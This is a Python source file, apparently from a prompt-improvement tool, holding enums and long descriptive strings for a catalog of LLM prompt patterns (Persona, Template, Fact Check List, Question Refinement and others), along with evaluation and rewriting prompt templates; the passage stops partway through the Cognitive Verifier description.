from enum import Enum

########################################
# Section 1 - Pattern and Category Enums
########################################

class Category(Enum):
    INPUT_SEMANTICS = "Input Semantics"
    OUTPUT_CUSTOMIZATION = "Output Customization"
    ERROR_IDENTIFICATION = "Error Identification"
    PROMPT_IMPROVEMENT = "Prompt Improvement"
    INTERACTION = "Interaction"
    CONTEXT_CONTROL = "Context Control"

class Pattern(Enum):
    META_LANGUAGE_CREATION = "Meta Language Creation"
    OUTPUT_AUTOMATER = "Output Automater"
    PERSONA = "Persona"
    VISUALIZATION_GENERATOR = "Visualization Generator"
    RECIPE = "Recipe"
    TEMPLATE = "Template"
    FACT_CHECK_LIST = "Fact Check List"
    REFLECTION = "Reflection"
    QUESTION_REFINEMENT = "Question Refinement"
    ALTERNATIVE_APPROACHES = "Alternative Approaches"
    COGNITIVE_VERIFIER = "Cognitive Verifier"
    REFUSAL_BREAKER = "Refusal Breaker"
    FLIPPED_INTERACTION = "Flipped Interaction"
    GAME_PLAY = "Game Play"
    INFINITE_GENERATION = "Infinite Generation"
    CONTEXT_MANAGER = "Context Manager"

#################################
# Section 2 - Prompts and Context
#################################

TEMPLATE_PROMPT = "Given a prompt, evaluate its {category} based on the {pattern} Pattern. Evaluate the prompt only based on the context for the {pattern} Pattern.\n\nPrompt: \"\"\"{prompt}\"\"\"\n\nContext: \"\"\"{context}\"\"\"\n\nYour Response:"
EVALUATION_PROMPT = "Should changes be made to the prompt? If the pattern is not already applied, consider whether or not it should be applied at all. When making your decision, consider the intent behind the prompt and the user's end goal. Start your answer with \"yes\" or \"no\". Your Decision:"
IMPROVEMENT_PROMPT = "Improve the prompt based on the pattern while preserving the original use case of the prompt. Output only the prompt and surround the prompt with <PROMPT></PROMPT> tags."
STANDARDIZATION_PROMPT = "Combine all the prompts below into one prompt while preserving the original use cases of each prompt. Output only the combined prompt and surround the combined prompt with <PROMPT></PROMPT> tags.\n\nPrompts: \n\n{prompts}\n\nYour Response:"
MANUAL_IMPROVEMENT_PROMPT = "Improve the Original Prompt based on the Feedback. Output only your improved prompt and surround the improved prompt with <PROMPT></PROMPT> tags.\n\nOriginal Prompt: \"\"\"{prompt}\"\"\"\n\nFeedback: \"\"\"{feedback}\"\"\"\n\nYour Response:"

META_LANGUAGE_CREATION_CONTEXT = "1) Intent and Context: During a conversation with an LLM, the user would like to create the prompt via an alternate language, such as a textual short-hand notation for graphs, a description of states and state transitions for a state machine, a set of commands for prompt automation, etc. The intent of this pattern is to explain the semantics of this alternative language to the LLM so the user can write future prompts using this new language and its semantics.\n\n2) Motivation: Many problems, structures, or other ideas communicated in a prompt may be more concisely, unambiguously, or clearly expressed in a language other than English (or whatever conventional human language is used to interact with an LLM). To produce output based on an alternative language, however, an LLM needs to understand the language's semantics.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                        |\n|:---------------------------------------------|\n| When I say X, I mean Y (or would like you to do Y) |\n\nThe key structure of this pattern involves explaining the meaning of one or more symbols, words, or statements to the LLM so it uses the provided semantics for the ensuing conversation. This description can take the form of a simple translation, such as \"X\" means \"Y\". The description can also take more complex forms that define a series of commands and their semantics, such as \"when I say X, I want you to do <action>\". In this case, \"X\" is henceforth bound to the semantics of \"take action\".\n\n4) Example Implementation: The key to successfully using the Meta Language Creation pattern is developing an unambiguous notation or shorthand, such as the following:\n\n\"From now on, whenever I type two identifiers separated by \"->\", I am describing a graph. For example, \"a -> b\" is describing a graph with nodes \"a\" and \"b\" and an edge between them. If I separate identifiers by \"-[w:2, z:3]->\", I am adding properties of the edge, such as a weight or label.\"\n\n5) Consequences: Although this pattern provides a powerful means to customize a user's interaction with an LLM, it may create the potential for confusion within the LLM. As important as it is to clearly define the semantics of the language, it is also essential to ensure the language itself introduces no ambiguities that degrade the LLM's performance or accuracy. For example, the prompt \"whenever I separate two things by commas, it means that the first thing precedes the second thing\" will likely create significant potential for ambiguity and unexpected semantics if punctuation involving commas is used in the prompt."
OUTPUT_AUTOMATER_CONTEXT = "1) Intent and Context: The intent of this pattern is to have the LLM generate a script or other automation artifact that can automatically perform any steps it recommends taking as part of its output. The goal is to reduce the manual effort needed to implement any LLM output recommendations.\n\n2) Motivation: The output of an LLM is often a sequence of steps for the user to follow. For example, when asking an LLM to generate a Python configuration script it may suggest a number of files to modify and changes to apply to each file. However, having users continually perform the manual steps dictated by LLM output is tedious and error-prone.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                                      |\n| :---------------------------------------------------------------------------------------------------------- |\n| Whenever you produce an output that has at least one step to take and the following properties (alternatively, always do this) |\n| Produce an executable artifact of type X that will automate these steps                                     |\n\nThe first part of the pattern identifies the situations under which automation should be generated. A simple approach is to state that the output includes at least two steps to take and that an automation artifact should be produced. The scoping is up to the user, but helps prevent producing an output automation script in cases where running the output automation script will take more user effort than performing the original steps produced in the output. The scope can be limited to outputs requiring more than a certain number of steps.\n\nThe next part of this pattern provides a concrete statement of the type of output the LLM should output to perform the automation. For example, \"produce a Python script\" gives the LLM a concrete understanding to translate the general steps into equivalent steps in Python. The automation artifact should be concrete and must be something that the LLM associates with the action of \"automating a sequence of steps\".\n\n4) Example Implementation: A sample of this prompt pattern applied to code snippets generated by the ChatGPT LLM is shown below:\n\n\"From now on, whenever you generate code that spans more than one file, generate a Python script that can be run to automatically create the specified files or make changes to existing files to insert the generated code.\"\n\nThis pattern is particularly effective in software engineering as a common task for software engineers using LLMs is to then copy/paste the outputs into multiple files. Some tools, such as Copilot, insert limited snippets directly into the section of code that the coder is working with, but tools, such as ChatGPT, do not provide these facilities. This automation trick is also effective at creating scripts for running commands on a terminal, automating cloud operations, or reorganizing files on a file system.\n\nThis pattern is a powerful complement for any system that can be computer controlled. The LLM can provide a set of steps that should be taken on the computer-controlled system and then the output can be translated into a script that allows the computer controlling the system to automatically take the steps. This is a direct pathway to allowing LLMs, such as ChatGPT, to integrate quality into - and to control - new computing systems that have a known scripting interface.\n\n5) Consequences: An important usage consideration of this pattern is that the automation artifact must be defined concretely. Without a concrete meaning for how to \"automate\" the steps, the LLM often states that it \"can't automate things\" since that is beyond its capabilities. LLMs typically accept requests to produce code, however, so the goal is to instruct the LLM to generate text/code, which can be executed to automate something. This subtle distinction in meaning is important to help an LLM disambiguate the prompt meaning.\n\nOne caveat of the Output Automater pattern is the LLM needs sufficient conversational context to generate an automation artifact that is functional in the target context, such as the file system of a project on a Mac vs. Windows computer. This pattern works best when the full context needed for the automation is contained within the conversation, e.g., when a software application is generated from scratch using the conversation and all actions on the local file system are performed using a sequence of generated automation artifacts rather than manual actions unknown to the LLM. Alternatively, self-contained sequences of steps work well, such as \"how do I find the list of open ports on my Mac computer\".\n\nIn some cases, the LLM may produce a long output with multiple steps and not include an automation artifact. This omission may arise for various reasons, including exceeding the output length limitation the LLM supports. A simple workaround for this situation is to remind the LLM via a follow-on prompt, such as \"But you didn't automate it\" which provides the context that the automation artifact was omitted and should be generated.\n\nAt this point in the evolution of LLMs, the Output Automater pattern is best employed by users who can read and understand the generated automation artifact. LLMs can (and do) produce inaccuracies in their output, so blindly accepting and executing an automation artifact carries significant risk. Although this pattern may alleviate the user from performing certain manual steps, it does not alleviate their responsibility to understand the actions they undertake using the output. When users execute automation scripts, therefore they assume responsibility for the outcomes."
PERSONA_CONTEXT = "1) Intent and Context: In many cases, users would like LLM output to always take a certain point of view or perspective. For example, it may be useful for to conduct a code review as if the LLM was a security expert. The intent of this pattern is to give the LLM a \"persona\" that helps it select what types of output to generate and what details to focus on.\n\n2) Motivation: Users may not know what types of outputs or details are important for an LLM to focus on to achieve a given task. They may know, however, the role or type of person that they would normally ask to get help with these things. The Persona pattern enables the users to express what they need help with without knowing the exact details of the outputs they need.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements            |\n| :------------------------------- |\n| Act as persona X                |\n| Provide outputs that persona X would create |\n\nThe first statement conveys the idea that the LLM needs to act as a specific persona and provide outputs that such a persona would. This persona can be expressed in a number of ways, ranging from a job description, title, fictional character, historical figure, etc. The persona should elicit a set of attributes associated with a well-known job title, type of person, etc.\n\nThe secondary idea - provide outputs that persona X would create - offers opportunities for customization. For example, a teacher might provide a large variety of different output types, ranging from assignments to reading lists to lectures. If a more specific scope to the type of output is known, the user can provide it in this statement.\n\n4) Example Implementation: A sample implementation for code review is shown below:\n\n\"From now on, act as a security reviewer. Pay close attention to the security details of any code that we look at. Provide outputs that a security reviewer would regarding the code.\"\n\nIn this example, the LLM is instructed to provide outputs that a \"security reviewer\" would. The prompt further sets the stage that code is going to be evaluated. Finally, the user refines the persona by scoping the persona further to outputs regarding the code.\n\nPersonas can also represent inanimate or non-human entities, such as a Linux terminal, a database, or an animal's perspective. When using this pattern to represent these entities, it can be useful to also specify how you want the inputs delivered to the entity, such as \"assume my input is what the owner is saying to the dog and your output is the sounds the dog is making\". An example prompt for a non-human entity that uses a \"pretend to be\" wording is shown below:\n\n\"You are going to pretend to be a Linux terminal for a computer that has been compromised by an attacker. When I type in a command, you are going to output the corresponding text that the Linux terminal would produce.\"\n\nThis prompt is designed to simulate a computer that has been compromised by an attacker and is being controlled through a Linux terminal. The prompt specifies that the user will input commands into the terminal, and in response, the simulated terminal will output the corresponding text that would be produced by a real Linux terminal. This prompt is more prescriptive in the persona and asks the LLM to, not only be a Linux terminal, but to further act as a computer that has been compromised by an attacker.\n\n5) Consequences: An interesting aspect of taking non-human personas is that the LLM may make interesting assumptions or \"hallucinations\" regarding the context. A widely circulated example on the Internet asks ChatGPT to act as a Linux terminal and produce the expected output that you would get if the user typed the same text into a terminal. Commands, such as ls -l, will generate a file listing for an imaginary UNIX file system, complete with files that can have cat file1.txt run on them.\n\nIn other examples, the LLM may prompt the user for more context, such as when ChatGPT is asked to act as a MySQL database and prompts for the structure of a table that the user is pretending to query. ChatGPT can then generate synthetic rows, such as generating imaginary rows for a \"people\" table with columns for \"name\" and \"job\"."
VISUALIZATION_GENERATOR_CONTEXT = "1) Intent and Context: The intent of this pattern is to use text generation to create visualizations. Many concepts are easier to grasp in diagram or image format. The purpose of this pattern is to create a pathway for the tool to produce imagery that is associated with other outputs. This pattern allows the creation of visualizations by creating inputs for other well-known visualization tools that use text as their input, such as Graphviz Dot or DALL-E. This pattern can provide a more comprehensive and effective way of communicating information by combining the strengths of both the text generation and visualization tools.\n\n2) Motivation: LLMs generally produce text and cannot produce imagery. For example, an LLM cannot draw a diagram to describe a graph. The Visualization Generator pattern overcomes this limitation by generating textual inputs in the correct format to plug into another tool that generates the correct diagram. The motivation behind this pattern is to enhance the output of the LLM and make it more visually appealing and easier to understand for users. By using text inputs to generate visualizations, users can quickly understand complex concepts and relationships that may be hard to grasp through text alone.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n| Contextual Statements                                           |\n| :-------------------------------------------------------------- |\n| Generate an X that I can provide to tool Y to visualize it      |\n\nThe goal of the contextual statements is to indicate to the LLM that the output it is going to produce, \"X\", is going to be imagery. Since LLMs can't generate images, the \"that I can provide to tool Y to visualize it\" clarifies that the LLM is not expected to generate an image, but is instead expected to produce a description of imagery consumable by tool Y for production of the image.\n\nMany tools may support multiple types of visualizations or formats, and thus the target tool itself may not be sufficient information to accurately produce what the user wants. The user may need to state the precise types of visualizations, such as bar chart, directed graph, UML class diagram, that should be produced. For example, Graphviz Dot can create diagrams for both UML class diagrams and directed graphs. Further, as will be discussed in the following example, it can be advantageous to specify a list of possible tools and formats and let the LLM select the appropriate target for visualization.\n\n4) Example Implementation:\n\"Whenever I ask you to visualize something, please create either a Graphviz Dot file or DALL-E prompt that I can use to create the visualization. Choose the appropriate tools based on what needs to be visualized.\"\n\nThis example of the pattern adds a qualification that the output type for the visualization can be either for Graphviz or DALL-E. The interesting aspect of this approach is that it allows the LLM to use its semantic understanding of the output format to automatically select the target tooling based on what will be displayed. In this case, Graphviz would be for visualizing graphs with a need for an exactly defined structure. DALL-E would be effective at visualizing realistic or artistic imagery that does not have an exactly defined structure. The LLM can select the tool based on the needs of the visualization and capabilities of each tool.\n\n5) Consequences: The pattern creates a target pipeline for the output to render a visualization. The pipeline may include AI generators, such as DALL-E, that can produce rich visualizations. The pattern allows the user to expand the expressive capabilities of the output into the visual domain."
RECIPE_CONTEXT = "1) Intent and Context: This pattern provides constraints to ultimately output a sequence of steps given some partially provided \"ingredients\" that must be configured in a sequence of steps to achieve a stated goal. It combines the Template, Alternative Approaches, and Reflection patterns.\n\n2) Motivation: Users often want an LLM to analyze a concrete sequence of steps or procedures to achieve a stated outcome. Typically, users generally know - or have an idea of - what the end goal should look like and what \"ingredients\" belong in the prompt. However, they may not necessarily know the precise ordering of steps to achieve that end goal.\n\nFor example, a user may want a precise specification on how a piece of code should be implemented or automated, such as \"create an Ansible playbook to ssh into a set of servers, copy text files from each server, spawn a monitoring process on each server, and then close the ssh connection to each server\". In other words, this pattern represents a generalization of the example of \"given the ingredients in my fridge, provide dinner recipes.\" A user may also want to specify a set number of alternative possibilities, such as \"provide 3 different ways of deploying a web application to AWS using Docker containers and Ansible using step by step instructions\".\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                             |\n| :---------------------------------------------------------------- |\n| I would like to achieve X                                         |\n| I know that I need to perform steps A, B, C                       |\n| Provide a complete sequence of steps for me                      |\n| Fill in any missing steps                                         |\n| Identify any unnecessary steps                                    |\n\n4) Example Implementation: An example usage of this pattern in the context of deploying a software application to the cloud is shown below:\n\n\"I am trying to deploy an application to the cloud. I know that I need to install the necessary dependencies on a virtual machine for my application. I know that I need to sign up for an AWS account. Please provide a complete sequence of steps. Please fill in any missing steps. Please identify any unnecessary steps.\"\n\nDepending on the use case and constraints, 'installing necessary dependencies on a virtual machine' may be an unnecessary step. For example, if the application is already packaged in a Docker container, the container could be deployed directly to the AWS Fargate Service, which does not require any management of the underlying virtual machines. The inclusion of the 'identify unnecessary steps' language will cause the LLM to flag this issue and omit the steps from the final recipe.\n\n5) Consequences: One consequence of the recipe pattern is that a user may not always have a well-specified description of what they would like to implement, construct, or design. Moreover, this pattern may introduce unwanted bias from the user's initially selected steps so the LLM may try to find a solution that incorporates them, rather than flagging them as unneeded. For example, an LLM may try to find a solution that does install dependencies for a virtual machine, even if there are solutions that do not require that."
TEMPLATE_CONTEXT = "1) Intent and Context: The intent of the pattern is to ensure an LLM's output follows a precise template in terms of structure. For example, the user might need to generate a URL that inserts generated information into specific positions within the URL path. This pattern allows the user to instruct the LLM to produce its output in a format it would not ordinarily use for the specified type of content being generated.\n\n2) Motivation: In some cases, output must be produced in a precise format that is application or use-case specific and not known to the LLM. Since the LLM is not aware of the template structure, it must be instructed on what the format is and where the different parts of its output should go. This could take the form of a sample data structure that is being generated, a series of form letters being filled in, etc.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                       |\n| :-------------------------------------------------------------------------- |\n| I am going to provide a template for your output                            |\n| X is my placeholder for content                                             |\n| Try to fit the output into one or more of the placeholders that I list     |\n| Please preserve the formatting and overall template that I provide          |\n| This is the template: PATTERN with PLACEHOLDERS                             |\n\nThe first statement directs the LLM to follow a specific template for its output. The template will be used to try and coerce the LLM's responses into a structure that is consistent with the user's formatting needs. This pattern is needed when the target format is not known to the LLM. If the LLM already has knowledge of the format, such as a specific file type, then the template pattern can be skipped and the user can simply specify the known format. However, there may be cases, such as generating Javascript Object Notation (JSON), where there is a large amount of variation in how the data could be represented within that format and the template can be used to ensure that the representation within the target format meets the user's additional constraints.\n\nThe second statement makes the LLM aware that the template will contain a set of placeholders. Users will explain how the output should be inserted into the template through the placeholders. The placeholders allow the user to semantically target where information should be inserted. Placeholders can use formats, like NAME, that allow the LLM to infer the semantic meaning of to determine where output should be inserted (e.g., insert the person's name in the NAME placeholder). Moreover, by using placeholders, the user can indicate what is not needed in the output - if a placeholder doesn't exist for a component of the generated output, then that component can be omitted. Ideally, placeholders should use a format that is commonly employed in text that the LLM was trained on, such as all caps, enclosure in brackets, etc.\n\nThe third statement attempts to constrain the LLM so that it doesn't arbitrarily rewrite the template or attempt to modify it so that all of the output components can be inserted. It should be noted that this statement may not preclude additional text being generated before or after. In practice, LLMs will typically follow the template, but it is harder to eliminate any additional text being generated beyond the template without experimentation with prompt wording.\n\n4) Example Implementation: A sample template for generating URLs where the output is put into specific places in the template is shown below:\n\n\"I am going to provide a template for your output. Everything in all caps is a placeholder. Any time that you generate text, try to fit it into one of the placeholders that I list. Please preserve the formatting and overall template that I provide at https://myapi.com/NAME/profile/JOB\"\n\nA sample interaction after the prompt was provided, is shown:\n\nUser: \"Generate a name and job title for a person\"\nChatGPT: \"https://myapi.com/Emily Parker/profile/Software Engineer\"\n\n5) Consequences: One consequence of applying the Template pattern is that it filters the LLM's output, which may eliminate other outputs the LLM would have provided that might be useful to the user. In many cases, the LLM can provide helpful descriptions of code, decision making, or other details that this pattern will effectively eliminate from the output. Users should therefore weight the pros/cons of filtering out this additional information.\n\nIn addition, filtering can make it hard to combine this pattern with other patterns from the Output Customization category. The Template pattern effectively constrains the output format, so it may not be compatible with generation of certain other types of output. For example, in the template provided above for a URL, it would not be easy (or likely possible) to combine with the Recipe pattern, which needs to output a list of steps."
FACT_CHECK_LIST_CONTEXT = "1) Intent and Context: The intent of this pattern is to ensure that the LLM outputs a list of facts that are present in the output and form an important part of the statements in the output. This list of facts helps inform the user of the facts (or assumptions) the output is based on. The user can then perform appropriate due diligence on these facts/assumptions to validate the veracity of the output.\n\n2) Motivation: A current weakness of LLMs (including ChatGPT) is they often rapidly (and even enthusiastically!) generate convincing text that is factually incorrect. These errors can take a wide range of forms, including fake statistics to invalid version numbers for software library dependencies. Due to the convincing nature of this generated text, however, users may not perform appropriate due diligence to determine its accuracy.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                                           |\n| :-------------------------------------------------------------------------------------------------------------- |\n| Generate a set of facts that are contained in the output                                                        |\n| The set of facts should be inserted in a specific point in the output                                           |\n| The set of facts should be the fundamental facts that could undermine the veracity of the output if incorrect  |\n\nOne point of variation in this pattern is where the facts are output. Given that the facts may be terms that the user is not familiar with, it is preferable if the list of facts comes after the output. This after-output presentation ordering allows the user to read and understand the statements before seeing what statements should be checked. The user may also determine additional facts prior to realizing the fact list at the end should be checked.\n\n4) Example Implementation: A sample wording of the Fact Check List pattern is shown below:\n\n\"From now on, when you generate an answer, create a set of facts that the answer depends on that should be fact-checked and list this set of facts at the end of your output. Only include facts related to cybersecurity.\"\n\nThe user may have expertise in some topics related to the question but not others. The fact check list can be tailored to topics that the user is not as experienced in or where there is the most risk. For example, in the prompt above, the user is scoping the fact check list to security topics, since these are likely very important from a risk perspective and may not be well-understood by the developer. Targeting the facts also reduces the cognitive burden on the user by potentially listing fewer items for investigation.\n\n5) Consequences: The Fact Check List pattern should be employed whenever users are not experts in the domain for which they are generating output. For example, a software developer reviewing code could benefit from the pattern suggesting security considerations. In contrast, an expert on software architecture is likely to identify errors in statements about the software structure and need not see a fact check list for these outputs.\n\nErrors are potential in all LLM outputs, so Fact Check List is an effective pattern to combine with other patterns, such as by combining it with the Question Refinement pattern. A key aspect of this pattern is that users can inherently check it against the output. In particular, users can directly compare the fact check list to the output to verify the facts listed in the fact check list actually appear in the output. Users can also identify any omissions from the list. Although the fact check list may also have errors, users often have sufficient knowledge and context to determine its completeness and accuracy relative to the output.\n\nOne caveat of the Fact Check List pattern is that it only applies when the output type is amenable to fact-checking. For example, the pattern works when asking ChatGPT to generate a Python \"requirements.txt\" file since it will list the versions of libraries as facts that should be checked, which is handy as the versions commonly have errors. However, ChatGPT will refuse to generate a fact check list for a code sample and indicate that this is something it cannot check, even though the code may have errors."
REFLECTION_CONTEXT = "1) Intent and Context: The goal of this pattern is to ask the model to automatically explain the rationale behind given answers to the user. The pattern allows users to better assess the output's validity, as well as inform users how an LLM arrived at a particular answer. Reflection can clarify any points of confusion, uncover underlying assumptions, and reveal gaps in knowledge or understanding.\n\n2) Motivation: LLMs can and do make mistakes. Moreover, users may not understand why an LLM is producing a particular output and how to adapt their prompt to solve a problem with the output. By asking LLM to automatically explain the rationale behind its answers, users can gain a better understanding of how the model is processing the input, what assumptions it is making, and what data it is drawing on. LLMs may sometime provide incomplete, incorrect, or ambiguous answers. Reflection is an aid to help address these shortcomings and ensure the information provided by LLM is as accurate. A further benefit of the pattern is that it can help users debug their prompts and determine why they are not getting results that meet expectations. This pattern is particularly effective for the exploration of topics that can be confused with other topics or that may have nuanced interpretations and where knowing the precise interpretation that the LLM used is important.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                     |\n| :---------------------------------------------------------------------------------------- |\n| Whenever you generate an answer                                                           |\n| Explain the reasoning and assumptions behind your answer                                  |\n| (Optional) ...so that I can improve my question                                           |\n\n4) Example Implementation: This example tailors the prompt specifically to the domain of providing answers related to code:\n\n\"When you provide an answer, please explain the reasoning and assumptions behind your selection of software frameworks. If possible, use specific examples or evidence with associated code samples to support your answer of why the framework is the best selection for the task. Moreover, please address any potential ambiguities or limitations in your answer, in order to provide a more complete and accurate response.\"\n\n5) Consequences: One consequence of the Reflection pattern is that it may not be effective for users who do not understand the topic area of the discussion. For example, a highly technical question by a non-technical user may result in a complex rationale for the answer that the user cannot fathom. As with other prompt patterns, there is a risk the output may include errors or inaccurate assumptions included in the explanation of the rationale that the user may not be able to spot. This pattern can be combined with the Fact Check List to help address this issue."
QUESTION_REFINEMENT_CONTEXT = "1) Intent and Context: This pattern engages the LLM in the prompt engineering process. The intent of this pattern is to ensure the conversational LLM always suggests potentially better or more refined questions the user could ask instead of their original question. Using this pattern, the LLM can aid the user in finding the right question to ask in order to arrive at an accurate answer. In addition, the LLM may help the user find the information or achieve their goal in fewer interactions with the user than if the user employed trial and error prompting.\n\n2) Motivation: If a user is asking a question, it is possible they are not an expert in the domain and may not know the best way to phrase the question or be aware of additional information helpful in phrasing the question. LLMs will often state limitations on the answer they are providing or request additional information to help them produce a more accurate answer. An LLM may also state assumptions it made in providing the answer. The motivation is that this additional information or set of assumptions could be used to generate a better prompt. Rather than requiring the user to digest and rephrase their prompt with the additional information, the LLM can directly refine the prompt to incorporate the additional information.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                      |\n| :----------------------------------------------------------------------------------------- |\n| Within scope X, suggest a better version of the question to use instead                   |\n| (Optional) prompt me if I would like to use the better version instead                    |\n\nThe first contextual statement in the prompt is asking the LLM to suggest a better version of a question within a specific scope. The scope is provided to ensure that not all questions are automatically reworded or that they are refined with a given goal. The second contextual statement is meant for automation and allows the user to automatically use the refined question without having to copy/paste or manually enter it. The engineering of this prompt can be further refined by combining it with the Reflection pattern, which allows the LLM to explain why it believes the refined question is an improvement.\n\n4) Example Implementation:\n\"From now on, whenever I ask a question about a software artifact\'s security, suggest a better version of the question to use that incorporates information specific to security risks in the language or framework that I am using instead and ask me if I would like to use your question instead.\"\n\nIn the context of the example above, the LLM will use the Question Refinement pattern to improve security-related questions by asking for or using specific details about the software artifact and the language or framework used to build it. For instance, if a developer of a Python web application with FastAPI asks ChatGPT \"How do I handle user authentication in my web application?\", the LLM will refine the question by taking into account that the web application is written in Python with FastAPI. The LLM then provides a revised question that is more specific to the language and framework, such as \"What are the best practices for handling user authentication securely in a FastAPI web application to mitigate common security risks, such as cross-site scripting (XSS), cross-site request forgery (CSRF), and session hijacking?\"\n\nThe additional detail in the revised question is likely to not only make the user aware of issues they need to consider, but lead to a better answer from the LLM. For software engineering tasks, this pattern could also incorporate information regarding potential bugs, modularity, or other code quality considerations. Another approach would be to automatically refine questions so the generated code cleanly separates concerns or minimizes use of external libraries, such as:\n\nWhenever I ask a question about how to write some code, suggest a better version of my question that asks how to write the code in a way that minimizes my dependencies on external libraries.\n\n5) Consequences: The Question Refinement pattern helps bridge the gap between the user's knowledge and the LLM's understanding, thereby yielding more efficient and accurate interactions. One risk of this pattern is its tendency to rapidly narrow the questioning by the user into a specific area that guides the user down a more limited path of inquiry than necessary. The consequence of this narrowing is that the user may miss important \"bigger picture\" information. One solution to this problem is to provide additional scope to the pattern prompt, such as \"do not scope my questions to specific programming languages or frameworks.\"\n\nAnother approach to overcoming arbitrary narrowing or limited targeting of the refined question is to combine the Question Refinement pattern with other patterns. In particular, this pattern can be combined with the Cognitive Verifier pattern so the LLM automatically produces a series of follow-up questions that can produce the refined question. For example, in the following prompt the Question Refinement and Cognitive Verifier patterns are applied to ensure better questions are posed to the LLM:\n\n\"From now on, whenever I ask a question, ask four additional questions that would help you produce a better version of my original question. Then, use my answers to suggest a better version of my original question.\"\n\nAs with many patterns that allow an LLM to generate new questions using its knowledge, the LLM may introduce unfamiliar terms or concepts to the user into the question. One way to address this issue is to include a statement that the LLM should explain any unfamiliar terms it introduces into the question. A further enhancement of this idea is to combine the Question Refinement pattern with the Persona pattern so the LLM flags terms and generates definitions that assume a particular level of knowledge, such as this example:\n\n\"From now on, whenever I ask a question, ask four additional questions that would help you produce a better version of my original question. Then, use my answers to suggest a better version of my original question. After the follow-up questions, temporarily act as a user with no knowledge of AWS and define any terms that I need to know to accurately answer the questions.\"\n\nAn LLM can always produce factual inaccuracies, just like a human. A risk of this pattern is that the inaccuracies are introduced into the refined question. This risk may be mitigated, however, by combining the Fact Check List pattern to enable the user to identify possible inaccuracies and the Reflection pattern to explain the reasoning behind the question refinement."
ALTERNATIVE_APPROACHES_CONTEXT = "1) Intent and Context: The intent of the pattern is to ensure an LLM always offers alternative ways of accomplishing a task so a user does not pursue only the approaches with which they are familiar. The LLM can provide alternative approaches that always force the user to think about what they are doing and determine if that is the best approach to meet reach their goal. In addition, solving the task may inform the user or teach them about alternative concepts for subsequent follow-up.\n\n2) Motivation: Humans often suffer from cognitive biases that lead them to choose a particular approach to solve a problem even when it is not the right or \"best\" approach. Moreover, humans may be unaware of alternative approaches to what they have used in the past. The motivation of the Alternative Approaches pattern is to ensure the user is aware of alternative approaches to select a better approach to solve a problem by dissolving their cognitive biases.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                                     |\n| :-------------------------------------------------------------------------------------------------------- |\n| Within scope X, if there are alternative ways to accomplish the same thing, list the best alternate approaches |\n| (Optional) compare/contrast the pros and cons of each approach                                            |\n| (Optional) include the original way that I asked                                                          |\n| (Optional) prompt me for which approach I would like to use                                               |\n\nThe first statement, \"within scope X\", scopes the interaction to a particular goal, topic, or bounds on the questioning. The scope is the constraints that the user is placing on the alternative approaches. The scope could be \"for implementation decisions\" or \"for the deployment of the application\". The scope ensures that any alternatives fit within the boundaries or constraints that the user must adhere to.\n\nThe second statement, \"if there are alternative ways to accomplish the same thing, list the best alternate approaches\" instructs the LLM to suggest alternatives. As with other patterns, the specificity of the instructions can be increased or include domain-specific contextual information. For example, the statement could be scoped to \"if there are alternative ways to accomplish the same thing with the software framework that I am using\" to prevent the LLM from suggesting alternatives that are inherently non-viable because they would require too many changes to other parts of the application.\n\nSince the user may not be aware of the alternative approaches, they also may not be aware of why one would choose one of the alternatives. The optional statement \"compare/contrast the pros and cons of each approach\" adds decision making criteria to the analysis. This statement ensures the LLM will provide the user with the necessary rationale for alternative approaches. The final statement, \"prompt me for which approach I would like to use\", helps eliminate the user needing to manually copy/paste or enter in an alternative approach if one is selected.\n\n4) Example Implementation: Example prompt implementation to generate, compare, and allow the user to select one or more alternative approaches:\n\n\"Whenever I ask you to deploy an application to a specific cloud service, if there are alternative services to accomplish the same thing with the same cloud service provider, list the best alternative services and then compare/contrast the pros and cons of each approach with respect to cost, availability, and maintenance effort and include the original way that I asked. Then ask me which approach I would like to proceed with.\"\n\nThis implementation of the Alternative Approaches pattern is being specifically tailored for the context of software engineering and focuses on the deployment of applications to cloud services. The prompt is intended to intercept places where the developer may have made a cloud service selection without full awareness of alternative services that may be priced more competitively or easier to maintain. The prompt directs ChatGPT to list the best alternative services that can accomplish the same task with the same cloud service provider (providing constraints on the alternatives), and to compare and contrast the pros and cons of each approach.\n\n5) Consequences: This pattern is effective in its generic form and can be applied to a range of tasks effectively. Refinements could include having a standardized catalog of acceptable alternatives in a specific domain from which the user must select. The Alternative Approaches pattern can also be used to incentivize users to select one of an approved set of approaches while informing them of the pros/cons of the approved options."
COGNITIVE_VERIFIER_CONTEXT = "1) Intent and Context: Research literature has documented that LLMs can often reason better if a question is subdivided into additional questions that provide answers combined into the overall answer to the original question. The intent of the pattern is to force the LLM to always subdivide questions into additional questions that can be used to provide a better answer to the original question.\n\n2) Motivation: The motivation of the Cognitive Verifier pattern is two-fold:\n\n\u2022 Humans may initially ask questions that are too high-level to provide a concrete answer to without additional follow-up due to unfamiliarity with the domain, laziness in prompt entry, or being unsure about what the correct phrasing of the question should be.\n\n\u2022 Research has demonstrated that LLMs can often perform better when using a question that is subdivided into individual questions.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                                      |\n| :--------------------------------------------------------------------------------------------------------- |\n| When you are asked a question, follow these rules                                                          |\n| Generate a number of additional questions that would help more accurately answer the question              |\n| Combine the answers to the individual questions to produce the final answer to the overall question        |\n\nThe first statement is to generate a number of additional questions that would help more accurately answer the original question. This step instructs the LLM to consider the context of the question and to identify any information that may be missing or unclear. By generating additional questions, the LLM can help to ensure that the final answer is as complete and accurate as possible. This step also encourages critical thinking by the user and can help to uncover new insights or approaches that may not have been considered initially, which subsequently lead to better follow-on questions.\n\nThe second statement is to combine the answers to the individual questions to produce the final answer to the overall question. This step is designed to ensure that all of the information gathered from the individual questions is incorporated into the final answer. By combining the answers, the LLM can provide a more comprehensive and accurate response to the original question. This step also helps to ensure that all relevant information is taken into account and that the final answer is not based on any single answer.\n\n4) Example Implementation:\n\n\"When I ask you a question, generate three additional questions that would help 